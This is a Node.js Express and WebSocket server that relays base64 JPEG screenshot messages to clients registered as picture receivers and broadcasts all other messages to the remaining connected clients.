const http = require("http");
const express = require("express");
const WebSocket = require("ws");

const app = express();
app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

const wss = new WebSocket.Server({ noServer: true });
server.on('upgrade', (request, socket, head) => {
    if (wss.shouldHandle(request)) {
        wss.handleUpgrade(request, socket, head, (ws) => {
            wss.emit('connection', ws, request);
        });
    } else {
        socket.destroy();
    }
});

server.listen(PORT, () => {
    
});

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId;

wss.on("connection", function (ws) {
    const userID = generateUniqueID();

    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });

    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners();
    });

    if (wss.clients.size === 1) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

function handleMessage(ws, data, userID) {
    let messageData;
    try {
        messageData = JSON.parse(data.toString());
    } catch (e) {
        console.error('Error parsing data:', e);
        return;
    }

    // Xử lý các loại tin nhắn một cách gọn gàng
    switch (messageData.command) {
        case 'Picture Receiver':
            pictureReceivers.set(userID, ws);
            break;
        case 'screenshot':
        case 'screenshot_result':
            if (messageData.data.startsWith('data:image/jpeg;base64')) {
                broadcastToPictureReceivers({
                    type: 'screenshot',
                    action: messageData.action,
                    screen: messageData.screen,
                    data: messageData.data
                });
            }
            break;
        default:
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
            break;
    }
}

function safeSend(ws, data) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(data, (error) => {
            if (error) {
                console.error("Error sending message:", error);
            }
        });
    }
}

function broadcastToPictureReceivers(message) {
    const data = JSON.stringify(message); 
    Array.from(pictureReceivers.values()).forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) {
                    console.error("Error sending message:", error);
                }
            });
        }
    });
}


function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
    wss.clients.forEach((client) => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
}

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping();
            }
        });
    }, 30000);
};
